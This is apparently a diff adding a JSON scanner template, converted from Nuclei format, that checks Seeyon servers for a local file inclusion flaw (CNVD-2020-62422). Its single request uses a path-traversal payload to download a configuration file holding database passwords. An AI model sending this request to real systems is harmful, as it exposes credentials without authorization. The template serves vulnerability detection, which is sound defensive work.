@@ -1,0 +1,160 @@
+{
+  "id": "CNVD-2020-62422",
+  "name": "Seeyon - Local File Inclusion",
+  "author": "pikpikcu",
+  "severity": "MEDIUM",
+  "description": "Seeyon is vulnerable to local file inclusion.",
+  "references": [
+    "https://blog.csdn.net/m0_46257936/article/details/113150699"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2020",
+    "lfi",
+    "seeyon"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/seeyon/webmail.do?method\u003ddoDownloadAtt\u0026filename\u003dindex.jsp\u0026filePath\u003d../conf/datasourceCtp.properties",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "application/x-msdownload"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "ctpDataSource.password"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2020-62422",
+    "info": {
+      "name": "Seeyon - Local File Inclusion",
+      "author": "pikpikcu",
+      "severity": "medium",
+      "description": "Seeyon is vulnerable to local file inclusion.",
+      "reference": [
+        "https://blog.csdn.net/m0_46257936/article/details/113150699"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "cnvd,cnvd2020,lfi,seeyon"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/seeyon/webmail.do?method\u003ddoDownloadAtt\u0026filename\u003dindex.jsp\u0026filePath\u003d../conf/datasourceCtp.properties"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "application/x-msdownload"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "ctpDataSource.password"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
